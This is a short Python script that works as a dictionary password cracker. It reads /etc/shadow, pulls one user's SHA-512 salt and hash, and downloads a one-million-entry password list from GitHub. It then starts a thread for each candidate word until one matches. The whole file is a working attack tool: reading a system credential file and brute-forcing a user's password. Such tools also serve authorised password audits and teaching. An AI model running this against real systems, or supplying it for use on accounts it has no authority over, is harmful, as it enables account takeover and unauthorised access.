from urllib.request import urlopen
from hmac import compare_digest
import crypt
import re
import os
from threading import Thread

def get_wordlist():
    url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt"
    return urlopen(url)

def get_hashed_pass(username):
    with open("/etc/shadow", 'r') as file:
        data = file.read()
        match_split = re.split(username.strip(), data)
        try:
            hashed = match_split[-1].split(':')[1]
            salt, hashed_pass = hashed.split('$')[2:4]
            return (salt.strip(), hashed_pass.strip())
        except IndexError:
            raise Exception("Invalid username entered, try again...")

def generate_pass(word, salt):
    return crypt.crypt(word, salt).split('$')[3]

def compare_hash(comp_hash, word, salt):
    decoded = word.decode('utf-8').strip()
    hashed = generate_pass(decoded, salt)
    if ( compare_digest(hashed, comp_hash) ):
        print("Match found: {}".format(decoded))
        os._exit(1)
    else:
        print("No match found for: {}".format(decoded))

def crack(username):
    wordlist = get_wordlist()
    salt, pass_to_check = get_hashed_pass(username)
    salt = "$6${}".format(salt)

    for line in wordlist:
        crack_thread = Thread(target=compare_hash, args=(pass_to_check, line, salt))
        crack_thread.start()

crack(input("Enter a valid username from \etc\shadow: "))
